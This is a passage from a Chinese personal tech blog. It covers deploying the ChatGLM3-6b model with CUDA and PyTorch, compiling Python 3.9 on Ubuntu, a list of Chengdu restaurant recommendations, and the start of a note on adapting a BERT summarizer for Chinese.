class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>可以看到显卡支持的最高CUDA版本为11.8（<strong>注意这里是显卡支持的最高CUDA版本，而并不是目前系统安装的CUDA版本</strong>！）</p><p>同时可以看到这台服务器上装载了两个显存大小都为24G的GPU 0和1，其中GPU 0的显存几乎已经完全占满。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122191115501.png" alt="image-20240122191115501"></p><p>输入以下命令，查看是否已经安装了cuda：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><p>如果出现 <code>Command &#39;nvcc&#39; not found, but can be installed with:</code> 的输出，说明该服务器的系统并没有安装cuda</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122193539449.png" alt="image-20240122193539449"></p><p>可以看到我这台服务器上面已经安装了cuda，版本为11.8，所以并不需要进行cuda和cudnn的安装</p><p><strong>如果你和我一样已经安装了cuda和cudnn，请跳转到下一部分，进行相对应torch-gpu的安装</strong></p><h3 id="cuda和cudnn的安装"><a href="#cuda和cudnn的安装" class="headerlink" title="cuda和cudnn的安装"></a>cuda和cudnn的安装</h3><p>这一部分我并没有进行，考虑后续有没有机会补上。</p><p>首先要创建一个Python ≥ 3.10的虚拟环境（chatglm3-6b要求）。</p><p>要注意虚拟环境中的cuda和系统中的cuda的区别，我这里的cuda就是直接安装在系统中，所有的虚拟环境都可以使用系统中安装的cuda</p><p>在虚拟环境中安装并使用其他版本的cuda，参考：<a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p><blockquote><p>要注意：如果你的cuda是直接安装在虚拟环境中，并非直接安装在系统中。是无法使用ncvv -V命令验证是否安装成功的，ncvv -V是通过系统变量来直接查询，而安装在虚拟环境中并没有直接建立系统变量。验证方法可以见上面链接的最后一部分。</p></blockquote><h2 id="pytorch-gpu的安装"><a href="#pytorch-gpu的安装" class="headerlink" title="pytorch-gpu的安装"></a>pytorch-gpu的安装</h2><p>pytorch-gpu的版本同样必须依赖于CUDA的版本。</p><p>注意，<code>conda install pytorch</code> 命令安装的是torch CPU版本，但是我们要使用GPU进行训练</p><p>在<a href="https://pytorch.org/get-started/previous-versions/">pytorch官网</a>上获取cuda11.8对应版本torch的安装命令</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122103348292.png" alt="image-20240122103348292"></p><p>复制对应的命令，执行安装</p><p>安装完成后编写程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch <span class="comment"># 如果pytorch安装成功即可导入</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available()) <span class="comment"># 查看CUDA是否可用</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count()) <span class="comment"># 查看可用的CUDA数量</span></span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) <span class="comment"># 查看CUDA版本</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122195902702.png" alt="image-20240122195902702"></p><p>已经配置成功</p><h2 id="安装剩余依赖"><a href="#安装剩余依赖" class="headerlink" title="安装剩余依赖"></a>安装剩余依赖</h2><p>clone下来ChatGLM3项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM3.git</span><br></pre></td></tr></table></figure><blockquote><p>超时的话挂梯子设置代理，使用服务器没办法挂梯子的话直接在github下载zip上传到服务器上</p></blockquote><p>由于已经安装了torch，所以我们要<strong>删掉项目目录下requirements.txt中的 <em>torch&gt;&#x3D;2.1.0</em> 一行</strong></p><p>并使用 pip 安装剩余的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>这里一定要删除torch相关依赖行！！不然会自动给你下载冲突的torch版本，后续项目报错</p></blockquote><h1 id="下载ChatGLM3-6b模型及参数"><a href="#下载ChatGLM3-6b模型及参数" class="headerlink" title="下载ChatGLM3-6b模型及参数"></a>下载ChatGLM3-6b模型及参数</h1><h2 id="方法1：从-Hugging-Face-Hub-下载模型"><a href="#方法1：从-Hugging-Face-Hub-下载模型" class="headerlink" title="方法1：从 Hugging Face Hub 下载模型"></a>方法1：从 Hugging Face Hub 下载模型</h2><p>首先需要安装Git LFS，否则会出现模型中的大型文件下载不完整的情况。</p><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br></pre></td></tr></table></figure><p>若显示 <code>Git LFS initialized</code> ，说明已经安装。</p><p>可以使用git进行克隆，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://huggingface.co/THUDM/chatglm3-6b</span><br></pre></td></tr></table></figure><p>如果下载比较慢或者超时，可以直接去<a href="https://huggingface.co/THUDM/chatglm3-6b">官网</a>下载模型再上传到服务器</p><h2 id="方法2：从-ModelScope-下载模型（推荐）"><a href="#方法2：从-ModelScope-下载模型（推荐）" class="headerlink" title="方法2：从 ModelScope 下载模型（推荐）"></a>方法2：从 ModelScope 下载模型（推荐）</h2><p>同样也可以在国内魔搭社区下载，一般不会超时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git clone https://www.modelscope.cn/ZhipuAI/chatglm3-6b.git</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里一定要<code>git lfs install</code>，虽然我查了这个命令仅仅只是用于验证是否安装了git lfs，但是我第一次从魔搭git clone的时候，没有使用这个命令产生了大文件下载不完整的情况，加上后没有再出现这样的问题，所以建议还是加上吧。</p></blockquote><h1 id="代码调用模型进行预测"><a href="#代码调用模型进行预测" class="headerlink" title="代码调用模型进行预测"></a>代码调用模型进行预测</h1><p>下载完成模型及参数文件后，我们将所有的文件放在一个文件夹<code>chatglm3-6b</code>里，然后将其放在项目文件夹ChatGLM3-main下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122202232999.png" alt="image-20240122202232999"></p><p>然后我们可以在项目主目录下创建test.py文件，通过如下代码调用 ChatGLM 模型来生成对话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModel.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>, device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>,response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要根据上下文的情况下</span></span><br><span class="line"><span class="comment"># response, history = model.chat(tokenizer, &quot;晚上睡不着应该怎么办&quot;, history=history)</span></span><br><span class="line"><span class="comment"># print(response)</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用”chatglm3-6b&#x2F;“就是加载了该文件夹下的本地模型及文件</p></blockquote><p>在命令行输入，执行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 python test.py</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里的 <code>CUDA_VISIBLE_DEVICES=1</code> 的作用是指定使用 GPU 1 来跑模型，因为我们前面已经通过 <code>nvidia-smi</code> 知道 GPU 0 的显存已经基本占满了</p><p>cuda指定GPU、设置多GPU的方法：<a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></blockquote><h1 id="构建网页版demo"><a href="#构建网页版demo" class="headerlink" title="构建网页版demo"></a>构建网页版demo</h1><p>官方教程：<a href="https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md">https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md</a></p><p>安装 Jupyter 内核：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython kernel install --name chatglm3-demo --user</span><br></pre></td></tr></table></figure><p>因为我们是本地下载的模型，所以需要先设置环境变量 <code>MODEL_PATH</code> 来指定从本地加载模型</p><p>直接在终端中输入如下命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MODEL_PATH=//home/xjb/event/ChatGLM3-main/chatglm3-6b</span><br></pre></td></tr></table></figure><p>然后输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 streamlit run composite_demo/main.py</span><br></pre></td></tr></table></figure><blockquote><p>注意这里一样要在命令的前面加上 <code>CUDA_VISIBLE_DEVICES=1</code> 来设置使用的GPU</p></blockquote><p>运行结果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204008879.png" alt="image-20240122204008879"></p><p>如果你部署在了服务器上而不是本机，访问对应的network url既可使用网页demo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204313569.png" alt="image-20240122204313569"></p><p>现在你就拥有一个属于自己的本地大模型啦，因为该模型较轻量级，预测的速度还是比较快的，在未经过微调的情况下我直接将其用于新闻文本的摘要任务，大概1-2秒可以生成一篇文本的摘要，效果也比较不错，但是偶尔会出现中英文乱码的情况。</p><p>你也可以对其进行进一步的领域微调，使其更适合你的任务。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p><a href="https://blog.csdn.net/qq_43705697/article/details/121618276">https://blog.csdn.net/qq_43705697/article/details/121618276</a></p></li><li><p><a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134563092">https://blog.csdn.net/m0_65814643/article/details/134563092</a></p></li><li><p><a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『linux』ubuntu修改python版本</title>
      <link href="/posts/3bee.html"/>
      <url>/posts/3bee.html</url>
      
        <content type="html"><![CDATA[<p><strong>motivation：</strong></p><p>服务器系统为：ubuntu20.04</p><p>查看系统中自带的python版本，可以发现系统自带的python3版本为python3.8。</p><p>因为我们需要在服务器部署的项目依赖python版本&gt;&#x3D;3.9，与Python3.8不兼容，所以需要安装python3.9。</p><p>本文详细记录在Ubuntu20.04（其他版本步骤也一样）上编译安装指定版本Python解释器的过程和可能遇到的问题，及多个Python版本并存的使用方法。</p><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><p>初次安装的时候，没有执行这个步骤，后续踩了比较多的坑，参考网上的文章后执行此步骤可以解决大部分的问题。</p><h2 id="更新系统软件"><a href="#更新系统软件" class="headerlink" title="更新系统软件"></a>更新系统软件</h2><p>在正式开始之前，建议首先检查系统软件是否均为最新，并更新到最新版本。</p><p>打开一个终端，输入以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 刷新软件包目录</span><br><span class="line">sudo apt update</span><br><span class="line"># 列出当前可用的更新</span><br><span class="line">sudo apt list --upgradable</span><br><span class="line"># 如上一步提示有可以更新的项目，则执行更新</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111170901524.png" alt="image-20240111170901524"></p><h2 id="安装GCC编译器"><a href="#安装GCC编译器" class="headerlink" title="安装GCC编译器"></a>安装GCC编译器</h2><p>打开一个终端，使用 apt 安装 GCC 编译器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 GCC 编译器</span></span><br><span class="line">sudo apt install gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 若显示出 GCC 版本则成功</span></span><br></pre></td></tr></table></figure><h2 id="安装其他依赖"><a href="#安装其他依赖" class="headerlink" title="安装其他依赖"></a>安装其他依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 刷新软件包目录</span></span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libbz2-dev liblzma-dev sqlite3 libsqlite3-dev tk-dev uuid-dev libgdbm-compat-dev</span><br></pre></td></tr></table></figure><p>注意，Python 的部分功能依赖于对应的库（如 OpenSSL、SQLite3、LZMA 等），如果在编译时未能找到这些库，仍然可能完成编译。此时的 Python 解释器看似可以工作，但在需要使用特定功能时就会出问题。例如 OpenSSL 出现问题会导致无法正常使用 pip。故建议按本节提示安装所有可选依赖项。</p><h1 id="查看系统自带python3版本"><a href="#查看系统自带python3版本" class="headerlink" title="查看系统自带python3版本"></a>查看系统自带python3版本</h1><p>在系统终端中输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin | grep python</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165216118.png" alt="image-20240111165216118"></p><p>可以看出使用系统的Python3指向版本python3.8</p><p>输入python3 –version可以查看详细版本信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165421131.png" alt="image-20240111165421131"></p><h1 id="下载安装python3-9"><a href="#下载安装python3-9" class="headerlink" title="下载安装python3.9"></a>下载安装python3.9</h1><h2 id="下载与解压"><a href="#下载与解压" class="headerlink" title="下载与解压"></a>下载与解压</h2><p>在<a href="https://www.python.org/ftp/python/%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84python3.9%E7%89%88%E6%9C%AC%E7%9A%84tgz%E5%AE%89%E8%A3%85%E5%8C%85">https://www.python.org/ftp/python/下找到我们想要安装的python3.9版本的tgz安装包</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165757616.png" alt="image-20240111165757616"></p><p>在终端中通过wget命令下载我们选择的安装包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>/Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p>解压安装包并进入目录（我这里选择解压到根目录下，读者可以自行选择解压路径）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz -C ~</span><br><span class="line"><span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">8</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在Python-3.8.5目录下：</p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make altinstall</span><br></pre></td></tr></table></figure><blockquote><p>这里使用应使用 <code>altinstall</code> 而不是 <code>install</code> 。</p><p>二者的一个重要区别在于，后者会创建符号链接，将 <code>python3</code> 等命令链接到正在安装的新版本 Python 3 上，这可能会破坏系统。更多信息请参阅当前目录下的 <code>README.rst</code> 文件。</p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>有的文章可能会在这里让你删除掉原有的python环境或者是修改python3命令指向新安装的python3.8环境，由于 Ubuntu 系统、安装的其他软件等很可能会依赖于系统原有的python环境等原因，都不要进行此类修改！！！</strong></p><p>下面对安装完成的python环境进行测试</p><p>在命令行输入python3.9（注意不要分开），可以看到已经成功安装了。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111172737068.png" alt="image-20240111172737068"></p><p>如果要在python3.9环境下安装库的话，使用pip3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173117603.png" alt="image-20240111173117603"></p><p>后续如果想用python3.9环境来执行代码的话，在前面加上python3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173227176.png" alt="image-20240111173227176"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/506491209">https://zhuanlan.zhihu.com/p/506491209</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unbuntu </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『成都』成都美食探店</title>
      <link href="/posts/1e32.html"/>
      <url>/posts/1e32.html</url>
      
        <content type="html"><![CDATA[<p>探店齁逼多，真假VV说。</p><p>已经在成都待了5年了，未来还有两年甚至也可能更久。这么长时间吃过的店铺也有不少了，这几天又有朋友要来成都找我玩，因为马上期末的缘故没有太多时间陪他们，就整理了一份这几年吃过的一些比较好吃的店铺，希望他们可以玩的开心！</p><h1 id="川菜"><a href="#川菜" class="headerlink" title="川菜"></a>川菜</h1><h2 id="鸡毛店"><a href="#鸡毛店" class="headerlink" title="鸡毛店"></a>鸡毛店</h2><ul><li><p>地点：天府宏</p></li><li><p>人均：50</p></li><li><p>评价：去过好几次了，味道很不错，注意有的店也叫鸡毛店但不一样，推荐天府宏的</p></li><li><p>推荐菜：</p><ul><li><p>蒜蓉生焖虾：必点，非常好吃</p></li><li><p>鸡丝凉面</p></li></ul></li></ul><h2 id="明婷饭店"><a href="#明婷饭店" class="headerlink" title="明婷饭店"></a>明婷饭店</h2><ul><li>地点：去过两个分店，都还可以</li><li>人均：60</li><li>评价：便宜，味道很不错，性价比高。</li><li>推荐菜：<ul><li>脑花豆腐：必点，特别下饭</li><li>奇香排骨：招牌</li></ul></li></ul><h2 id="陈麻婆豆腐"><a href="#陈麻婆豆腐" class="headerlink" title="陈麻婆豆腐"></a>陈麻婆豆腐</h2><ul><li>地点：总店在杜甫草堂对面</li><li>人均：60</li><li>评价：麻婆豆腐非常好吃，其他菜一般般。建议去总店！</li><li>推荐菜：<ul><li>麻婆豆腐：非遗</li></ul></li></ul><h2 id="永乐饭店"><a href="#永乐饭店" class="headerlink" title="永乐饭店"></a>永乐饭店</h2><ul><li>地点：武侯区</li><li>人均：50</li><li>评价：便宜好吃，网上评价都比较好，我还没吃过</li><li>推荐菜：<ul><li>照着招牌点就行</li></ul></li></ul><h1 id="翘脚牛肉"><a href="#翘脚牛肉" class="headerlink" title="翘脚牛肉"></a>翘脚牛肉</h1><h2 id="冯四嬢翘脚牛肉"><a href="#冯四嬢翘脚牛肉" class="headerlink" title="冯四嬢翘脚牛肉"></a>冯四嬢翘脚牛肉</h2><ul><li>地点：世豪广场</li><li>人均：30</li><li>评价：上次朋友来成都玩吃过一次，感觉比较好吃，牛肉很新鲜。</li><li>推荐菜：<ul><li>翘脚牛肉</li><li>鲜血旺</li><li>粉蒸牛肉</li></ul></li></ul><h1 id="烧烤"><a href="#烧烤" class="headerlink" title="烧烤"></a>烧烤</h1><h2 id="新奥尔良烧烤"><a href="#新奥尔良烧烤" class="headerlink" title="新奥尔良烧烤"></a>新奥尔良烧烤</h2><ul><li>地点：（这家店地图上搜不到，可以搜索生火火地摊小炉子烧烤，再旁边），在玉林西路</li><li>人均：60</li><li>评价：烤翅神中神，其他的也不错</li><li>推荐菜：<ul><li>烤翅</li><li>让老板娘帮着拿，都不错</li></ul></li></ul><h1 id="美蛙鱼"><a href="#美蛙鱼" class="headerlink" title="美蛙鱼"></a>美蛙鱼</h1><h2 id="味之绝"><a href="#味之绝" class="headerlink" title="味之绝"></a>味之绝</h2><ul><li>地点：连锁店，哪里都有</li><li>人均：60</li><li>评价：味道不错</li></ul><h1 id="冒烤鸭"><a href="#冒烤鸭" class="headerlink" title="冒烤鸭"></a>冒烤鸭</h1><h2 id="回味冒烤鸭"><a href="#回味冒烤鸭" class="headerlink" title="回味冒烤鸭"></a>回味冒烤鸭</h2><ul><li>地点：回味冒烤鸭（川大店）</li><li>人均：20</li><li>评价：价格便宜，好吃</li></ul><h1 id="火锅"><a href="#火锅" class="headerlink" title="火锅"></a>火锅</h1><p>感觉火锅味道都差不多？</p><h2 id="矮板凳"><a href="#矮板凳" class="headerlink" title="矮板凳"></a>矮板凳</h2><ul><li>地点：连锁，哪里都有</li><li>人均：70</li><li>评价：实验室聚餐去吃过几次，味道还可以，价格也还行</li></ul><h2 id="星鸿社"><a href="#星鸿社" class="headerlink" title="星鸿社"></a>星鸿社</h2><ul><li>地点：建设路&#x2F;电子科技大学</li><li>人均：100+</li><li>评价：一家重庆老火锅。上次朋友来玩一起去吃过，味道很好，但是价格比较贵。</li></ul><h1 id="串串"><a href="#串串" class="headerlink" title="串串"></a>串串</h1><h2 id="六年二班串串"><a href="#六年二班串串" class="headerlink" title="六年二班串串"></a>六年二班串串</h2><ul><li><p>地点：人民公园店</p></li><li><p>人均：40</p></li><li><p>评价：本地人舍友推荐，还没去过</p></li></ul><h1 id="小龙虾"><a href="#小龙虾" class="headerlink" title="小龙虾"></a>小龙虾</h1><h2 id="龙虾一绝"><a href="#龙虾一绝" class="headerlink" title="龙虾一绝"></a>龙虾一绝</h2><ul><li>地点：玉林西路</li><li>人均：70</li><li>评价：本地人舍友推荐的一家龙虾店，去吃过一次，价格较贵，感觉一般般，也有可能是我点的是微辣的原因。</li></ul><h1 id="小吃"><a href="#小吃" class="headerlink" title="小吃"></a>小吃</h1><h2 id="建设北路"><a href="#建设北路" class="headerlink" title="建设北路"></a>建设北路</h2><ul><li><p>烤苕皮</p></li><li><p>油条糯米糍（不叫这个，具体叫啥忘了）：个人觉得非常好吃，每次去都买一个肉松味的。</p></li><li><p>冰粉：必吃，一般吃火锅点一个。</p></li><li><p>冰豆花</p></li><li><p>蛋烘糕</p></li><li><p>成都市很好吃的火锅粉：很多人说超好吃，但我还没去吃过。推荐脑花、火锅粉。</p></li><li><p>钵钵鸡</p></li><li><p>担担面</p></li></ul><h2 id="宽菜日记"><a href="#宽菜日记" class="headerlink" title="宽菜日记"></a>宽菜日记</h2><ul><li>推荐菜：<ul><li>甜皮鸭：都说很好吃，还没吃过，有机会尝试下。建议买来后1-2小时内吃，放久了就不好吃了。</li></ul></li></ul><h2 id="蹄花"><a href="#蹄花" class="headerlink" title="蹄花"></a>蹄花</h2><ul><li><p>吴氏蹄花：川大望江校区附近，学长学姐祖传的老店，个人觉得比较便宜而且好吃，推荐雪豆蹄花汤，可以顺便点一个他们的铁板烧，很好吃。</p></li><li><p>无名蹄花：大众点评必吃榜上的，没吃过</p></li></ul><h1 id="不推荐"><a href="#不推荐" class="headerlink" title="不推荐"></a>不推荐</h1><h2 id="陶德砂锅"><a href="#陶德砂锅" class="headerlink" title="陶德砂锅"></a>陶德砂锅</h2><p>网红店。很一般，本地人都不推荐的店</p><h2 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h2><p>本人去过好几次，感觉也是比较一般，而且偏贵，推荐菜：芝士烤红薯</p><h2 id="冒椒火辣"><a href="#冒椒火辣" class="headerlink" title="冒椒火辣"></a>冒椒火辣</h2><p>网红店。小菜很好吃（脑花好吃），但是串串感觉味道很一般，偏贵</p><h2 id="饕林餐厅"><a href="#饕林餐厅" class="headerlink" title="饕林餐厅"></a>饕林餐厅</h2><p>网红店。个人觉得很一般，而且偏贵。-</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』修改bert-extractive-summarizer项目用于中文文本摘要任务</title>
      <link href="/posts/fbe6.html"/>
      <url>/posts/fbe6.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>本文为bert-extractive-summarizer项目改中文模型记录</p><ul><li><p>主页文档：<a href="https://pypi.org/project/bert-extractive-summarizer/">https://pypi.org/project/bert-extractive-summarizer/</a></p></li><li><p>github项目地址：<a href="https://github.com/dmmiller612/bert-extractive-summarizer">https://github.com/dmmiller612/bert-extractive-summarizer</a></p></li></ul><p>该模型的原理在于：通过bert生成句子嵌入，对句子嵌入做聚类，找到最接近聚类质心的句子，同时使用<a href="https://github.com/huggingface/neuralcoref">neuralcoref</a>库实现共指消解功能（比较符合目前的业务，项目数据集中的政治新闻大多系外媒台媒文章，不像国内的文章那样规范，行文比较随意，同时因为外文翻译为中文存在一些语句翻译质量低，所以存在很多的指代问题）</p><p>发现原始模型做的是英文的摘要生成，要进行中文摘要需要将其修改成中文的Bert模型和分词器，参考作者给出的<a href="https://geek.digiasset.org/pages/nlp/nlpinfo/bert-text-summarizer-chinese/">中文模型文档</a>和github下的<a href="https://github.com/dmmiller612/bert-extractive-summarizer/issues/45">issue</a>完成了中文摘要的提取。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="spacy-neuralcoref-搭建共指消解环境"><a href="#spacy-neuralcoref-搭建共指消解环境" class="headerlink" title="spacy + neuralcoref 搭建共指消解环境"></a>spacy + neuralcoref 搭建共指消解环境</h2><p>指代消解任务通过<code>spacy + uralcoref</code>实现。spacy是一个NLP领域的文本预处理Python库，包括分词、词性标注、依存分析等多个nlp基础任务的实现，neuralcoref相当于一个插件，在spacy框架下实现指代消解。</p><p>我在初次安装过程中<strong>出现了Spacy和neuralcoref的版本适配问题</strong>，安装很多版本都不能顺利运行，各种error。最终找到一个匹配的安装方式，按照下面的流程来进行安装的话应该不会出现兼容性的问题。</p><p>如果你是<strong>英文任务</strong>的话，推荐：<strong>spacy 2.1.0 + neuralcoref 4.0 + en_core_web_sm-2.1.0</strong></p><blockquote><p>但是这一套对中文模型版本并不适用， neuralcoref并不支持中文共指消解。所以对中文任务而言，如果要使用这里的共指消解，需要使用其他的支持中文的共指消解工具。</p><p>因此<strong>我们后面的中文摘要生成部分并没有使用共指消解，后续有机会可以尝试加上</strong></p></blockquote><p>我们先pip install spacy&#x3D;&#x3D;2.1.0，前面提到neuralcoref相当于spaCy的一个插件，所以先安装neuralcoref会自动帮我们安装 spacy，可能会产生版本冲突。</p><p>接下来安装spacy 2.1.0版本库上的 transformer-based pipelines 的预训练模型 en_core_web_sm-2.1.0，<strong>注意这里的版本一定要和前面的spacy一样</strong>，产生报错建议手动安装 </p><p>安装完spacy后安装neuralcoref，<strong>建议这里去pypi上找到对应的 <a href="https://pypi.org/project/neuralcoref/#files">neuralcoref包</a> 下载到本地后手动安装</strong>，不然可能会产生下面的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215165152653.png" alt="image-20231215165152653"></p><h2 id="搭建-bert-extractive-summarizer-环境"><a 